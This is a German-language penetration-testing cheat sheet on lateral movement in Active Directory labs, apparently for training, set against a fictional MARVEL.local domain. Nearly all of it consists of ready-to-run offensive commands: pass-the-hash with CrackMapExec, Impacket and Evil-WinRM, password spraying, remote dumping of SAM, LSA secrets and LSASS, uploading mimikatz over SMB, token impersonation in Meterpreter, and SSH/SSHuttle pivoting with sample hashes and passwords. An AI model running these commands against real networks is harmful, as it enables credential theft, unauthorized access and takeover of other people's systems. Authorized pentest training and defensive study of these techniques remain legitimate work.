# Lateral Movement

## Ziel der Lateral Movement Phase

- Bewegung zwischen kompromittierten Systemen
- Zugriff auf zusätzliche Hosts mit vorhandenen Credentials
- Credential Reuse über Netzwerk
- Kompromittierung weiterer Systeme für Privilege Escalation
- Etablierung von Zugriffen auf kritische Assets

---

## Pass-the-Hash (PTH)

### CrackMapExec PTH

#### Netzwerk-weites PTH



```bash
# Über gesamtes Subnet
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

**Ergebnis-Indikatoren:**

- `[+]` = Erfolgreiche Authentication
- `Pwn3d!` = Administrative Privilegien auf System
- `[-]` = Authentication fehlgeschlagen

#### Einzelnes Target



```bash
# Spezifisches System
crackmapexec smb 192.168.xx.x -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

### Impacket PTH

#### PSExec mit Hash



```bash
# Standard PTH mit PSExec
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# Nur NT-Hash
impacket-psexec administrator@192.168.xx.x -hashes :7facdc498ed1680c4fd1448319a8c04f
```

#### WMIExec mit Hash



```bash
# WMI-basiertes PTH
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

#### SMBExec mit Hash



```bash
# File-basiertes PTH
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

### Evil-WinRM PTH



```bash
# WinRM mit NT-Hash
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef

# Alternativer Syntax
evil-winrm -i 10.10.175.181 -u administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## Password Spraying

### CrackMapExec Password Spraying



```bash
# Single Password gegen Netzwerk
crackmapexec smb 192.168.xx.x/24 -u mmustermann -d MARVEL.local -p Password1
```

**Erwartete Ausgabe:**

- `[+]` = Credential Match
- `Pwn3d!` = Admin-Zugriff auf System
- Target-Liste für weitere Exploitation

---

## Credential Dumping für Lateral Movement

### Secretsdump auf Multiple Hosts



```bash
# Workstation 1
impacket-secretsdump MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# Workstation 2
impacket-secretsdump MARVEL.local/mmustermann:'Password1'@192.168.xx.x
```

**Extrahiert:**

- Lokale Administrator Hashes
- Cached Domain Credentials
- LSA Secrets (Service Account Passwords)

### CrackMapExec Automated Dumping

#### SAM Extraction



```bash
# Automatischer SAM-Dump über Netzwerk
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
```

#### LSA Secrets



```bash
# LSA Secrets über Netzwerk extrahieren
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

### lsassy Memory Dumping



```bash
# LSASS Memory Dump remote
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl 10.10.255.70
```

---

## SMB-basiertes Lateral Movement

### Share Enumeration



```bash
# Share Discovery
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```

**Entdeckt:**

- Administrative Shares (C,ADMIN, ADMIN ,ADMIN, IPC$)
- Custom File Shares
- Read/Write Permissions per Share

### SMB File Transfer



```bash
# Dateien hochladen via SMB
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimikatz.exe Windows\\Temp\\mimikatz.exe"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimidrv.sys Windows\\Temp\\mimidrv.sys"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimilib.dll Windows\\Temp\\mimilib.dll"
```

### SMB Client Access



```bash
# Mit Credentials
smbclient -L //192.168.xx.x -U "MARVEL\mmustermann%Password1"

# Share mounten
smbclient //192.168.xx.x/C$ -U "MARVEL\mmustermann%Password1"
```

---

## Remote Code Execution für Lateral Movement

### PSExec über Multiple Hosts



```bash
# Host 1
impacket-psexec marvel.local/mmustermann:'Password1'@192.168.xx.x

# Host 2
impacket-psexec MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# Mit Hash
impacket-psexec -hashes :7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

### WMIExec für Stealth Movement



```bash
# WMI-basierte Execution
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

**Vorteil:** Keine Service-Erstellung, weniger Logs

### SMBExec Alternative



```bash
# File-basierte Execution
impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

---

## Network Pivoting für Lateral Movement

### SSH SOCKS Tunneling

#### Tunnel Setup



```bash
# SOCKS Proxy über SSH
ssh -f -N -D 9050 -i pivot root@10.10.155.5

# Mit Custom Port
ssh -f -N -D 9050 -i pivot -p 2222 root@10.10.155.5
```

**Parameter:**

- `-f` = Background nach Auth
- `-N` = Keine Remote Commands
- `-D 9050` = Local SOCKS Proxy auf Port 9050
- `-i pivot` = Private Key File

#### Tunnel Status prüfen



```bash
# Tunnel verifizieren
netstat -tlnp | grep 9050

# SSH Prozesse
ps aux | grep ssh

# Tunnel beenden
kill [SSH_PID]
```

### ProxyChains Configuration



```bash
# Config anzeigen
cat /etc/proxychains4.conf

# Config editieren
sudo nano /etc/proxychains4.conf
# Am Ende hinzufügen:
socks5 127.0.0.1 9050
```

### ProxyChains Usage für Lateral Movement

#### Nmap via Proxy



```bash
# Network Scan durch Tunnel
proxychains nmap -sT -Pn 10.10.10.0/24

# Specific Target
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.225

# Service Detection
proxychains nmap -sV -p 445 10.10.10.225
```

#### SMB Enumeration via Proxy



```bash
# SMB Client
proxychains smbclient -L //10.10.10.225 -U administrator

# CrackMapExec
proxychains crackmapexec smb 10.10.10.0/24 -u administrator -p 'Hacker321!'

# Share Access
proxychains smbclient //10.10.10.225/C$ -U administrator
```

#### Kerberoasting via Proxy



```bash
# GetUserSPNs durch Tunnel
proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.225 -request
```

#### RDP via Proxy



```bash
# Remote Desktop durch Tunnel
proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.225

# Mit Domain
proxychains xfreerdp /u:administrator /p:'Hacker321!' /d:MARVEL /v:10.10.10.225

# Certificate Ignore
proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.225 /cert-ignore
```

---

## SSHuttle für VPN-Style Movement

### Basic SSHuttle Tunnel



```bash
# Entire Subnet routen
sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
```

**Parameter:**

- `-r root@10.10.155.5` = Jump Host
- `10.10.10.0/24` = Ziel-Subnet
- `--ssh-cmd` = Custom SSH Command mit Key

### Multiple Subnets



```bash
# Mehrere Netze gleichzeitig
sshuttle -r root@10.10.155.5 10.10.10.0/24 192.168.1.0/24 --ssh-cmd "ssh -i pivot"
```

### Mit Exclusions



```bash
# Subnet mit Ausnahmen
sshuttle -r root@10.10.155.5 10.10.10.0/24 -x 10.10.10.1 --ssh-cmd "ssh -i pivot"
```

### Verbose Output



```bash
# Debug-Informationen
sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot" -v
```

### Direct Access nach SSHuttle



```bash
# Keine ProxyChains erforderlich
nmap -sS 10.10.10.225
xfreerdp /u:admin /p:pass /v:10.10.10.225
crackmapexec smb 10.10.10.0/24 -u administrator -p password
```

---

## Multi-Hop Pivoting

### ProxyChains mit Multiple Hops



```bash
# /etc/proxychains4.conf editieren:
socks5 127.0.0.1 9050    # First Hop
socks5 127.0.0.1 9051    # Second Hop

# Multiple SSH Tunnels
ssh -f -N -D 9050 -i pivot1 root@10.10.155.5
ssh -f -N -D 9051 -i pivot2 user@10.20.20.5
```

### SSHuttle Chain



```bash
# Erster Tunnel zu Intermediate Network
sshuttle -r root@10.10.155.5 10.20.0.0/16 --ssh-cmd "ssh -i pivot1"

# Zweiter Tunnel durch erstes Netzwerk (neues Terminal)
sshuttle -r user@10.20.20.5 192.168.xx.x/24 --ssh-cmd "ssh -i pivot2"
```

---

## Token-basiertes Lateral Movement

### Token Impersonation Setup



```bash
# In Meterpreter Session
load incognito
list_tokens -u
```

### Domain User Token nutzen



```bash
# Token impersonieren
impersonate_token marvel\\\\mmustermann

# Verifizierung
shell
whoami
exit
```

### Lateral Movement via Token

cmd

```cmd
# In impersonierter Shell
net view \\192.168.xx.x
net use \\192.168.xx.x\C$ /user:MARVEL\mmustermann
dir \\192.168.xx.x\C$
```

---

## CrackMapExec Database für Movement Tracking

### CME Database Access



```bash
cmedb
```

**Verfügbare Befehle:**

- `hosts` = Entdeckte Systeme anzeigen
- `creds` = Gesammelte Credentials
- `shares` = Enumerierte Shares
- `groups` = Domain Groups

**Verwendung für Lateral Movement:**

- Tracking welche Credentials auf welchen Hosts funktionieren
- Identifikation von Systemen mit gleichen lokalen Admin Passwords
- Mapping von erfolgreichen Authentifizierungen

---

## BloodHound für Movement Planning

### Session Enumeration


```bash
# BloodHound mit Session-Collection
sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c Session
```

### Attack Path Queries

cypher

```cypher
# Shortest Path zu Domain Admins
# In GUI Pathfinding Tab:
# Start Node: mmustermann@MARVEL.LOCAL
# End Node: DOMAIN ADMINS@MARVEL.LOCAL
```

**Lateral Movement Opportunities:**

- User mit Sessions auf multiple Systemen
- Shared Local Administrator Passwords
- Service Accounts mit breitem Zugriff

---

## Credential Reuse Patterns

### Lokale Admin Hash Reuse



```bash
# Gleicher lokaler Admin Hash über Netzwerk
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

**Häufig erfolgreich bei:**

- Workstations aus gleicher Deployment-Image
- Systeme mit standardisiertem Setup
- Umgebungen ohne LAPS

### Domain Credential Reuse



```bash
# Domain User über Multiple Systems
crackmapexec smb 192.168.xx.x/24 -u mmustermann -d MARVEL.local -p Password1
```

---

## Tool-Vergleich für Lateral Movement

|Tool|Methode|Stealth|Use Case|
|---|---|---|---|
|psexec.py|Service Creation|Niedrig|Standard Movement|
|wmiexec.py|WMI Objects|Mittel|Stealth Movement|
|smbexec.py|File-based (ADMIN$)|Mittel|No Service|
|evil-winrm|WinRM/PowerShell|Hoch|Interactive|
|CrackMapExec|Multiple|Variable|Automation|

---

## Lateral Movement Workflow

### Phase 1: Credential Collection



```bash
# 1. SAM Dumps auf kompromittierten Hosts
impacket-secretsdump MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# 2. LSA Secrets
crackmapexec smb 192.168.xx.x -u administrator -H [hash] --local-auth --lsa

# 3. Memory Dump
lsassy -u mmustermann -p Password1 -d MARVEL.local 192.168.xx.x
```

### Phase 2: Credential Testing



```bash
# 1. Password Spraying
crackmapexec smb 192.168.xx.x/24 -u mmustermann -d MARVEL.local -p Password1

# 2. Hash Spraying
crackmapexec smb 192.168.xx.x/24 -u administrator -H [hash] --local-auth

# 3. Erfolgreiche Hosts notieren
```

### Phase 3: Access Establishment



```bash
# 1. Shell auf neue Hosts
impacket-psexec MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# 2. Weitere Credentials sammeln
impacket-secretsdump MARVEL.local/mmustermann:'Password1'@192.168.xx.x

# 3. Prozess wiederholen
```

### Phase 4: Network Pivoting (optional)


```bash
# 1. SSH Tunnel etablieren
ssh -f -N -D 9050 -i pivot root@10.10.155.5

# 2. ProxyChains konfigurieren
sudo nano /etc/proxychains4.conf

# 3. Remote Network enumerieren
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u administrator -p password
```

---

## Troubleshooting

### PTH Failures


```bash
# Wenn PTH fehlschlägt:
# 1. Hash-Format prüfen (LM:NT oder :NT)
# 2. Local Admin Rechte auf Target
# 3. SMB Signing Status
# 4. Firewall/Ports

# Hash-Format testen
crackmapexec smb 192.168.xx.x -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

### Pivoting Issues


```bash
# SSH Tunnel prüfen
netstat -tlnp | grep 9050
ps aux | grep ssh

# SOCKS Proxy testen
curl --socks5 127.0.0.1:9050 http://10.10.10.225

# ProxyChains Debug
proxychains curl http://google.com
```

### SSHuttle Issues


```bash
# Debug Mode
sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot" -vv

# Routing prüfen
ip route show

# SSHuttle beenden
sudo pkill sshuttle
```

---

## Success Indicators

### Lateral Movement Success

- ✅ Credentials funktionieren auf multiple Hosts
- ✅ Shell-Zugriff auf neue Systeme etabliert
- ✅ Zusätzliche Credentials gesammelt
- ✅ Zugriff auf kritische Assets

### Pivoting Success

- ✅ SSH/SSHuttle Tunnel stabil
- ✅ Internal Hosts via Proxy erreichbar
- ✅ Services via Tunnel zugänglich
- ✅ Keine häufigen Disconnects

### Credential Reuse Success

- ✅ Lokaler Admin Hash auf multiple Systeme
- ✅ Domain Credentials weit verbreitet
- ✅ Service Accounts mit breitem Zugriff
- ✅ Privilege Escalation Opportunities identifiziert

---

## Network Pivoting Comparison

|Feature|ProxyChains + SSH|SSHuttle|
|---|---|---|
|Setup Complexity|Mittel (Config erforderlich)|Niedrig (ein Command)|
|Application Support|Per-Application|System-wide|
|Performance|Gut|Besser|
|Flexibility|Hoch (multiple Tools)|Mittel|
|Root Required|Nein|Ja|
|DNS Handling|Manuelle Config|Automatisch|
|Multiple Subnets|Manual|Native Support|

---

## Cleanup

### SSH Tunnels beenden


```bash
# SSH Prozesse auflisten
ps aux | grep ssh

# Spezifischen Tunnel beenden
kill [SSH_PID]

# Alle SSH Tunnels beenden
pkill -f "ssh -f -N -D"
```

### SSHuttle beenden


```bash
# SSHuttle Prozesse beenden
sudo pkill sshuttle

# Routing wird automatisch wiederhergestellt
```

### Shells schließen


```bash
# Evil-WinRM
exit

# Impacket Shells
exit

# Meterpreter
exit
```
